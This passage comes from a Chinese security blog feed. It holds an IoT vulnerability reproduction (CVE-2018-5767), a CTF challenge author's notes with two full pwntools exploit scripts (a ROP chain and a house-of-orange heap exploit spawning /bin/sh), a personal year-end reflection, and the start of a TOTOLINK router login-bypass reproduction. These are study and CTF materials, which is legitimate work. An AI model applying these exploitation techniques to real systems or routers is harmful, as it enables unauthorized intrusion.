定位到对应的字符串<br>代码审计可以发现是这个if判断的锅<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151225667.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151225667.png" alt="image.png"></a><br>我们需要进入这个if分支 才能正常使用程序<br>则使得r3不为0即可<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151226154.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151226154.png" alt="image.png"></a><br>随后又迎来了一个问题 可以看到虽然此时httpd已经成功启动 但是其获取到的ip地址明显不对 所以我们需要一个网桥接口来使得可以正常获取ip地址<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151227278.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151227278.png" alt="image.png"></a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install uml-utilities bridge-utils</span><br><span class="line">sudo brctl addbr br0</span><br><span class="line">sudo ifconfig br0 up</span><br><span class="line">sudo ifconfig br0 192.168.xx.xx</span><br></pre></td></tr></table></figure><p>随后我们再次运行httpd程序 可以发现成功获取到了ip地址<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162013409.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162013409.png" alt="image.png"></a><br>暂时挂起这个进程 我们ping这个地址如果可以ping通就成功了<br>但是还是发现无法正常访问网页<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162038394.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162038394.png" alt="image.png"></a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp -rf ./webroot_ro/* ./webroot/`</span><br></pre></td></tr></table></figure><p>把目录复制一下就行了 原理暂时还没搞懂<br>这个师傅的文章看到的 <a href="https://cn-sec.com/archives/1727127.html">https://cn-sec.com/archives/1727127.html</a></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>通过官方给出的分析<br><a href="https://fidusinfosec.com/remote-code-execution-cve-2018-5767/">https://fidusinfosec.com/remote-code-execution-cve-2018-5767/</a><br>可以知道漏洞点位于R7WebsSecurityHandler函数中<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162018442.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162018442.png" alt="image.png"></a><br>调用了sscanf函数把cookie中的password参数传入到了栈上 而httpd文件就开启了一个NX<br>所以可以进行一个栈溢出的rop链利用<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162032062.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162032062.png" alt="image.png"></a><br>看其他师傅是可以使用python脚本来发送请求的 但是不知道为啥我不行 所以这里采用bp来发包 （第二天补的这句话 发现是我的终端加了http和https的代理<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162059777.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162059777.png" alt="image.png"></a><br>随后可以看到程序终止了 报段错误<br>于是使用gdb-multiarch来进行动态调试 寻找触发段错误的指令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo chroot ./ ./qemu-arm-static -g 1234 ./bin/httpd</span><br><span class="line"></span><br><span class="line">gdb-multiarch ./bin/httpd</span><br><span class="line">target remote:1234</span><br><span class="line">c</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162124061.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162124061.png" alt="image.png"></a><br>可以看到程序卡在了这里 由于r3寄存器被我们填入的垃圾数据覆盖<br>而ldrb需要访问r3寄存器存储的内存地址中的数据 所以这里产生了非法的内存访问 从而导致了段错误<br>通过backtrace指令 可以看到此指令是由0x2c5cc触发的 在ida中寻找一下<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162127376.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162127376.png" alt="image.png"></a><br>在if分支中有一个函数涉及到了该地址<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162129667.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162129667.png" alt="image.png"></a><br>所以我们要做的就是跳过if分支 这样才可以执行到我们控制的rop链<br>绕过if分支的条件则是在’.’后跟上这些后缀名<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162130898.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162130898.png" alt="image.png"></a><br>随后就是简单的栈溢出 直接打system就行了<br>但是 由于我的vmmap不知道为啥获取不到对应的libc地址<br>所以复现失败</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="iot" scheme="http://example.com/categories/iot/"/>
    
    
  </entry>
  
  <entry>
    <title>Sictf_round2出题小记</title>
    <link href="http://example.com/2023/09/11/Sictf-round2%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/"/>
    <id>http://example.com/2023/09/11/Sictf-round2%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/</id>
    <published>2023-09-11T04:43:02.000Z</published>
    <updated>2023-09-14T17:21:11.120Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h2><p>被非预期打穿了呜呜呜  应该清空一下栈的内容 或者加个内联汇编修改一下rdx寄存器的值</p><p>原本的做法是劫持rbp寄存器 修改rsi寄存器 随后就可以利用write函数泄露bss段上的libc</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">binary = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64/libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(binary)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment">#context.arch = &quot;i386&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">io = process(binary)</span><br><span class="line"><span class="comment">#io = remote(&quot;192.168.0.104&quot;,32770)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Hello!!!&quot;</span>)</span><br><span class="line">leak_addr = <span class="number">0x404040</span></span><br><span class="line">write_addr = <span class="number">0x4011E2</span></span><br><span class="line">bss_addr = elf.bss(<span class="number">0xa00</span>)</span><br><span class="line">ptr_addr = <span class="number">0x4011F1</span></span><br><span class="line">payload = cyclic(<span class="number">0x20</span>)+p64(leak_addr+<span class="number">0x20</span>+<span class="number">0x20</span>)+p64(ptr_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x4011FE&#x27;)</span></span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">payload = p64(bss_addr)+p64(write_addr)+cyclic(<span class="number">0x10</span>)+p64(leak_addr+<span class="number">0x20</span>)+p64(ptr_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.send(p8(<span class="number">0x80</span>))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">libc_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x21a780</span></span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">rdi_addr = libc_addr + <span class="built_in">next</span>(libc.search(asm(<span class="string">&quot;pop rdi;ret&quot;</span>)))</span><br><span class="line">ret_addr = <span class="number">0x000000000040101a</span></span><br><span class="line">payload = cyclic(<span class="number">0x28</span>)+p64(ret_addr)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x4011FE&#x27;)</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h2><p>house of orange 不过对泄露堆地址的步骤改了改</p><p>没开PIE 这样可以用unsortedbin attack往存放堆块指针的地址写入堆地址 就可以泄露堆地址了</p><p>然后要明白unsortedbin attack为什么使用过一次后 再次进行堆块操作就会报错 是因为破坏了main_arena以及fd bk域 修复一下就可以再次进行unsortedbin attack了 随后就是house of orange的部分了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;210.44.151.51&quot;</span>,<span class="number">10202</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./ld-linux.so.2&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/home/chen/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)</span><br><span class="line"><span class="comment">#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,payload</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content :&quot;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,payload</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content :&quot;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">payload = cyclic(<span class="number">0x38</span>)+p64(<span class="number">0xfc1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">b&#x27;1&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">libc_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3c5131</span></span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">payload = cyclic(<span class="number">0x48</span>)+p64(<span class="number">0xf51</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x4040E0</span>+<span class="number">0x40</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf40</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">show(<span class="number">10</span>)</span><br><span class="line">io.recv()</span><br><span class="line">heap_addr = u64(io.recv(<span class="number">4</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x22010</span></span><br><span class="line">success(<span class="string">&quot;heap_addr :&quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">payload = p64(heap_addr+<span class="number">0x22010</span>)+p64(heap_addr+<span class="number">0x90</span>)*<span class="number">3</span></span><br><span class="line">edit(<span class="number">10</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">main_arena = libc_addr + <span class="number">0x3c4b20</span>+<span class="number">88</span></span><br><span class="line">payload = cyclic(<span class="number">0x48</span>)+p64(<span class="number">0xf51</span>)+p64(main_arena)*<span class="number">2</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">IO_list_all = libc_addr + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">payload = cyclic(<span class="number">0x30</span>) <span class="comment">#填充到old top chunk</span></span><br><span class="line">fake_file = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x60</span>) <span class="comment">#覆盖size 使其释放到smallbin 0x60链表</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)+p64(IO_list_all-<span class="number">0x10</span>) <span class="comment">#伪造bk域</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)+p64(<span class="number">1</span>) <span class="comment">#布局io_write_ptr和io_write_base</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xc0</span>,<span class="string">b&#x27;\x00&#x27;</span>) <span class="comment">#填充偏移</span></span><br><span class="line">payload += fake_file + p64(<span class="number">0</span>)*<span class="number">3</span>+p64(heap_addr+<span class="number">0x1a8</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(system_addr) <span class="comment">#伪造vtable结构体</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Size :&quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0x30</span>))</span><br><span class="line">io.interactive()</span><br><span class="line"><span class="comment"># debug()</span></span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="extra" scheme="http://example.com/categories/extra/"/>
    
    
  </entry>
  
  <entry>
    <title>大一总结</title>
    <link href="http://example.com/2023/08/24/%E5%A4%A7%E4%B8%80%E6%80%BB%E7%BB%93/"/>
    <id>http://example.com/2023/08/24/%E5%A4%A7%E4%B8%80%E6%80%BB%E7%BB%93/</id>
    <published>2023-08-24T15:18:00.000Z</published>
    <updated>2023-09-14T17:17:50.334Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h2><p>岁月匆匆 一转眼的瞬间 大一就要结束了 回顾去年的所作所为 有满意的地方也有不尽人意的 时至今日 也无法改变什么了 很喜欢漂流少年的一句台词 就以这句台词来开启本篇总结吧</p><p><strong>人生就是一场无尽的徒劳 但是 正是因为毫无意义 我才会觉得活着的这个瞬间 这份辉煌很可贵 因为这是此时此刻 只属于我的东西</strong></p><h2 id="为什么打CTF"><a href="#为什么打CTF" class="headerlink" title="为什么打CTF"></a>为什么打CTF</h2><p>这个问题或许解释成 为什么想打竞赛比较好 在高考结束后的那个暑假 我第一次对于人生有了看法 考上好大学是为了什么? 老师父母都会跟我说这是对自己的人生负责 为了过上好日子 所以好大学&#x3D;好人生？为了找到这个问题的答案 我喜欢骑着自行车穿梭在城市的各个角落 这也是现在公路车这个爱好的起源 看那些不同阶级的人 一天中的不同时间 不同地方 能看到不同的人生</p><p>依稀记得是七月份的某天凌晨 实在是睡不着 于是说决定去骑车看看这座城市早上的样子吧 最开始看到的是三四点骑着三轮载着菜赶往早市的大妈  晚些时候 路过了建筑工地 看到的是扛起了整个家庭的父亲 找了一家靠近工地的早餐店 看着来来往往的工人和早班的白领 第一次对于人生有了比较大的感悟 这是以前在学校的环境中所体会不到的 对于<strong>钱</strong>这一概念 更加深刻了 </p><p>后来 高考成绩出了 意外的收获了最好的一次 不过最后也还是来了福建师范大学 要说满意呢 其实也没有 一直以来都在给自己一个借口 我只不过是学的时间比较短 高三才开始认真学 如果早点学我可以去更好的学校 这样的借口来麻痹自己 给予自己我很聪明的假象 所以 我打算从一开始就认真一次 我想看看自己的极限在哪里 如果我努力到了在本校前列 我就和同样是双非的比较 如果我到了这一层次的前列 我就继续向上看齐 我想看看自己的极限在哪里</p><p>这种对于自己高考成绩的不甘心 以及萌生的对于钱的认知 我下定决心 在大学的期间 我的努力要让我赚到钱 在当时的我看来 一个人的出息与否 等同于他能赚到的钱</p><p>浅薄的认知告诉我 进大厂&#x3D;赚大钱 而双非本科的学历属实是不够看 所以提升简历 就放在了第一位 由此想到了通过竞赛来提升简历 这也是最开始 一加到新生群 就询问acm相关的事项(当时哪里知道还有个ctf</p><p>大概是在本校的oj刷了七十多道题吧  专业最后也是知晓了 网络空间安全 一开始选择这个专业呢 一方面是当时报考的想到传统的程序员的竞争压力会不会过大 所以选择了另外一条赛道 其实这种避开卷的赛道思想也出现在高二选择了物化地上面</p><p>总之 了解了过后 才知道acm对于网络空间安全的帮助没有那么大 同时两个比赛一起打 如果不是天才的话 只会两个水平都一般 所以最后是选择了打ctf</p><h2 id="为什么走pwn方向"><a href="#为什么走pwn方向" class="headerlink" title="为什么走pwn方向"></a>为什么走pwn方向</h2><p>一方面呢也是因为我想避开竞争压力大的赛道 也就是选择的人多的web方向</p><p>一方面也是实际做题下来 发现其他方向用到的工具太多了 知识点也很繁杂 而且做出题的思路我不是很喜欢</p><p>总感觉是偏向于脑洞 相比较 pwn的对于漏洞思想的考察 我就很喜欢这种节奏 在学习起效了以后 经常会自发性的研究漏洞 自己鼓捣一些利用方式</p><h2 id="学习途中帮助很大的人！"><a href="#学习途中帮助很大的人！" class="headerlink" title="学习途中帮助很大的人！"></a>学习途中帮助很大的人！</h2><p>第一位启蒙导师 应该要属本校的acm学长 阿凌 也是最开始acm猛刷七十多道题的时候认识的 由于涉及个人隐私 这里不方便说他的经历  但是他背水一战的经历 在直到现在的很多时候 都能给予我坚持的动力应该来说 对于大学四年的安排 是他第一个给了我大概的规划 因为是家中三代第一个大学生 对于大学是一个什么样的存在 其实不是很清楚 然后对于就业的一些浅薄的认知 也是听闻他</p><p>第二位 当属在高三暑假学习pwn中认识的外校学长 幽林师傅 时至今日 一些解决不了的问题 也是经常请教 特别是在学习的初期阶段 很多弱智问题 幽林师傅都耐心的解答了 特表感激！</p><p>第三位 也是帮助最大的一位 外校的xiaobin学长 应该是九月初认识的 当初是因为询问本校的历年校赛 是他出的 从而有了联系 最后靠xiaobin师傅的提拔和器重 也是有了很多机会 间接和本校的学长熟络了 也认识了很多外校厉害的学长 可以说是开阔了视野 同时也十分感激有一晚的手把手教学动态调试 到现在 每次做题 也是最喜欢动态调试的过程 有一种自己发掘到程序的最底层原理的快感</p><p>第四位 应该属本校的各位学长 引导了初期对于ctf赛事的认知 以及未来就业或者是读研的情况  更是带着我这个饭桶 一路杀到了国赛总决赛！直接开始可汗大点兵(排名不分先后 邵学长 李学长  林学长 陈学长 谢学长等等 以及协会的所有学长学姐！</p><p>第五位 留给在学习途中 给予我各种各样帮助的师傅! 没有他们的帮助就没有现在的我(草 说的跟获奖感言一样 不过是发自肺腑的</p><h2 id="大一的CTF总结"><a href="#大一的CTF总结" class="headerlink" title="大一的CTF总结"></a>大一的CTF总结</h2><p>对于我一个零基础 在大学前 接触电脑只有玩过minecraft和4399的来说 上来就是从二进制方向入门 属实够呛 对于什么虚拟地址啊 寄存器啊都是一头雾水 大一上学期的学习只能说是一塌糊涂 学习的进度非常缓慢 应该是停留在模板化的利用栈以及低版本的堆</p><p>对于漏洞的利用灵活起来 应该是在西湖论剑 也是第一场有输出的大赛 其前两题都是关于栈的灵活应用 在赛后复现完并且吃透了以后 对于栈的利用帮助非常大 也是自那以后 开始萌生了对于漏洞利用的思考 </p><p>到了大一下学期 由于本校的陈学长推荐 面试了联合战队vn 也是属于ctf生涯中比较大的一个转折点 从原本的圈子中跳了出来 认识到了原来还有这么多厉害的人 意识到了和他们之间的差距 一直都是我向上努力追赶的动力 同时由于vn战队和安恒有出题方面的合作 因此我赚到了大学的第一桶金</p><p>随后就是比较重要的两场比赛吧 福建省的省赛黑盾杯 以及国赛CISCN 前者呢 是一直听xiaobin学长说已经两年pwn零解了 所以对于当时的我来说 如果打破了这个诅咒 就是我厉害的地方了哈哈(还记得在最初版的博客里有一句话 打破不可能 说的就是这个  也是非常没有辜负自己的期望 在今年的黑盾杯复赛 成功拿下了pwn题目的一血！ </p><p>国赛CISCN 也是一路打到了决赛 最后拿下了全国三等奖 不过这个比赛更多靠的是学长的带飞 这里就不邀功了233 一笔带过</p><p>其他的小比赛呢 更多的是其他学校的举报的校赛或者是联合战队举办的比赛 这里做个大概的总结吧</p><p><strong>1.ISCTF2022 新生赛道一等奖(laffey✌带飞的 我是混逼)</strong></p><p><strong>2.skynico2022 总榜第七 二等奖(个人赛 虽然我感觉也很水)</strong></p><p><strong>3.GDOUCTF2023 外校赛道第五名 三等奖(跟着vn的师傅打的 我是混逼)</strong></p><p><strong>4.NISA2023 总榜第二 一等奖 (师大自己办的校赛 运气好)</strong></p><p><strong>5.NEEPUCTF2023 外校赛道第八名 三等奖(个人赛 打的师傅比较少 捡漏233)</strong></p><p><strong>6.LITCTF2023 外校赛道第七名 二等还是三等来着忘了 (跟着vn的师傅打的 我是混逼)</strong></p><p><strong>7.CISCN2023 华东南分区赛一等奖(学长带飞 不过我有点输出 欸嘿 特别是抢了一题一血 因为那题简直就是我的出题方式低配版)</strong></p><p><strong>8.CISCN2023 总决赛三等奖 （别说了 恰保底 而且更多的锅在我身上 是真爆零了 题目策略的问题 第二天复现的时候一小时就把一题做出来的 如果我出了说不定就不用恰保底了 草）</strong></p><p><strong>9.NepNepctf2023 总榜19名 三等奖(分值设置的比较不合理 运气好捡漏)</strong></p><p><strong>10.ISCC2023 三等奖 (草 写这个单纯为了凑到十个好看点 写出来的时候我都笑了 什么鸡儿奖项)</strong></p><h2 id="对于未来的规划"><a href="#对于未来的规划" class="headerlink" title="对于未来的规划"></a>对于未来的规划</h2><p>一年下来呢 目前的水平其实比较尴尬 跟金字塔尖的大佬差的实在有点多 不上不下 不过由于今年跟着学长混了个国三 我个人认为ctf这块对于简历的帮助已经差不多了 未来不会再花太多精力在这上面 应该是算半退役 未来更多的时间呢 我希望学好英语 不单单是为了过四六级 也是对于更远的未来的一种保底的打算 以及学好iot方向 这是我在众多二进制就业方向中选择的一个比较感兴趣的方向 希望能在大二时挖到第一个CVE!</p><p>然后就是十分笼统的对于性格方面的期待啦 希望自己一直保持向上看齐的乐观心态 时刻对自己的菜狗水平有认知 不骄不躁的完成既定的目标</p><h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>洋洋洒洒的写了三千多字 废话也是比较多 关于人生的思考 我也是明白一点了 正应罗翔老师说过的 人生就像是一场电影 我们没有办法决定我们的剧本 我们的出生 我们的智商等等 但是哪怕你手里的牌再差 也只能尽力去打</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="something to say" scheme="http://example.com/categories/something-to-say/"/>
    
    
  </entry>
  
  <entry>
    <title>ToToLink-X5000R登录绕过</title>
    <link href="http://example.com/2023/08/15/ToToLink-X5000R%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87/"/>
    <id>http://example.com/2023/08/15/ToToLink-X5000R%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87/</id>
    <published>2023-08-15T10:26:41.000Z</published>
    <updated>2023-09-14T17:21:03.291Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>跟着看雪上的这位师傅复现的 <a href="https://www.kanxue.com/chm.htm?id=17830">https://www.kanxue.com/chm.htm?id=17830</a> </p><p>好文章 学到了面对一个路由器时的分析思路</p><h2 id="模拟"><a href="#模拟" class="headerlink" title="模拟"></a>模拟</h2><p>固件下载地址<a href="http://www.totolink.cn/home/menu/newstpl.html?menu_newstpl=products&id=65">http://www.totolink.cn/home/menu/newstpl.html?menu_newstpl=products&amp;id=65</a></p><p>mipsel架构  模拟脚本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#/bin/sh</span><br><span class="line">sudo tunctl -t top0 -u root</span><br><span class="line">sudo ifconfig top0 192.168.6.2</span><br><span class="line">sudo qemu-system-mipsel -M malta -kernel ./mipsel_kernel/vmlinux-3.2.0-4-4kc-malta -hda ./mipsel_kernel/debian_squeeze_mipsel_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -net nic -net tap,ifname=top0 -nographic</span><br></pre></td></tr></table></figure><p>模拟起来后 进入其中配置eth0网络接口与top0位于同一c段</p><p>随后打包squashfs-root文件夹 通过scp上传到模拟系统中</p><p>以squashfs-root文件夹为根目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chroot ./squashfs-root/ /bin/sh</span><br></pre></td></tr></table></figure><p>随后启动路由器服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./usr/sbin/lighttpd -f ./lighttp/lighttpd.conf</span><br></pre></td></tr></table></figure><p><a 